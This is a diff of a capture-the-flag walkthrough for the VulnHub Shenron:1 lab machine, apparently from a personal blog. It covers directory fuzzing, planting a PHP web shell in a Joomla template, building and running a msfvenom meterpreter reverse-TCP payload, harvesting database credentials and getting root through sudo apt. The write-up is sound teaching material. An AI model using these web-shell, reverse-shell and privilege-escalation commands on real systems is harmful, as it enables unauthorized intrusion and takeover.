@@ -36,12 +36,13 @@ We can see that the target is running both an SSH server and an Apache web serve
 ![Wep App Index Page](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web%20app%20index%20page.png)
 
 In the real-world scenario, the default page might be left temporarily during the setup or testing phases of the web application. So let's try to find any hidden directories in the web application. I performed the fuzzing here using **ffuf** it can be done using your tool of preference.
-Command used: ```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```
+Command used: ```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br>
 ![Directory Fuzzing](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/dir-fuzzing-1.png)
 
 The fuzzing process can uncover two interesting directories which are *test* and *joomla*. The directory joomla already gives us a hint that the web application may be running the well-known CMS Joomla. Let's browse these directories chronologically as they appeared during our fuzzing.
-Browsing to the *test* directory we notice that directory listing is enabled which is a vulnerability in itself. We can note this vulnerability in our *Findings* folder. 
+Browsing to the *test* directory we notice that directory listing is enabled which is a vulnerability in itself. We can note this vulnerability in our **Findings** folder. 
 ![Directory Listing](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/directory-listing.png)
+
 We can also see a file having an interesting name i.e. *password*, accessing the file from our command line reveals to us a pair of credentials belonging to a certain admin user.
 ![File Accessed](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-accessed-1.png)
 
@@ -50,19 +51,19 @@ Nex let's visit the second directory *joomla* uncovered during our fuzzing. We c
 ![Joomla Login](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/joomla-login.png)
 
 ## Exploitation
-We can see that we successfully login as the admin. We can now attempt to add a PHP shell to one PHP file in an unused template. Here, we will choose the protostar template and add our basic PHP shell ```system($_GET["cmd"]);``` to the error.php file.
+We can see that we successfully login as the admin. After a successful login, we move to Extensions -> Templates -> Templates were can now attempt to add a PHP shell to one PHP file in an unused template. Here, we will choose the protostar template and add our basic PHP shell ```system($_GET["cmd"]);``` to the error.php file.
 *NB: In a real-world penetration test try to use a more complicated name such as a hash for the GET parameter value. Anyone can access that file hence if a common name is used attackers may bruteforce it and also use it to establish their foothold in your client environment.*
 ![Template Modification](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/template-modification.png)
-After modifying our template we can now execute commands on our target. ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```
+After modifying our template we can now execute commands on our target. ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br>
 ![RCE Test](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/rce-test.png)
 
 This web shell is good but to facilitate our work, we will employ Meterpreter, a sophisticated payload integrated into the Metasploit Framework. To use a meterpreter on our target we first need to craft one using the msfvenom tool from the Metasploit Framework.
-```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```
+```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```<br>
 ![Payload Crafting](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-crafting-1.png)
 Now after crafting our payload we then start a small HTTP server to transfer the payload to our target using Python3 http.server module.
 ![Python Server](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/python-server-1.png)
 
-We then use *wget* on our target to download to download the payload to the */tmp* directory.
+We then use wget on our target to download to download the payload to the /tmp directory.
 ![Download Operation](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/download-operation-1.png)
 Before executing our payload we need to configure our listener in Metasploit.
 ![Metasploit Set Up](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/metasploit-set-up.png)
@@ -70,7 +71,7 @@ After starting our listener we can now give execution permission to our payload 
 ![Payload Execution](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-exec-1.png)
 Going back to the listener, we can see that we caught a shell.
 ![Catching Shell](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/catching-shell-1.png)
-After obtaining a shell as the web user it's a good habit to search for the *web.config* file in the web root directory which may contain credentials for the database user.<br> *NB: The name of this file may change depending on the preference of the web administrator.*
+After obtaining a shell as the web user it's a good habit to search for the *web.config* file in the web root directory which may contain credentials for the database user. In this machine the file is named **web.config.txt**, and reading its content reveals to us the credentials for the database user.<br> *NB: The name of this file may change depending on the preference of the web administrator.*
 ![Web Config File](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web-root-dir.png)
 ![DB User Creds](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/db-creds.png)
 We see that the credentials belong to the user **jenny** who is also a user on the target machine so let's try to authenticate as the user jenny.<br>
@@ -94,6 +95,10 @@ We can now use that password to read Shenron's sudo rights
 ![Sudo Right]()
 We can observe that this account can be used to run apt with root privilege. Let's browse to [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to see how we can exploit this right to obtain a root shell. Here the command ```sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh``` can be used to obtain a root shell as demonstrated in the image.
 ![Root Access](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/root-access.png) 
+Great we have obtained root access to the machine, having this access means we own the machine and can do whatever we want. 
+
+## Conclusion
+Great, in this walkthrough we have learned how a simple file listing vulnerability could be used to take over a machine. In a real-world assessment, the last step will be to gather our findings and draft a report for our clients. Thanks for following up the walkthrough.
 
 
 
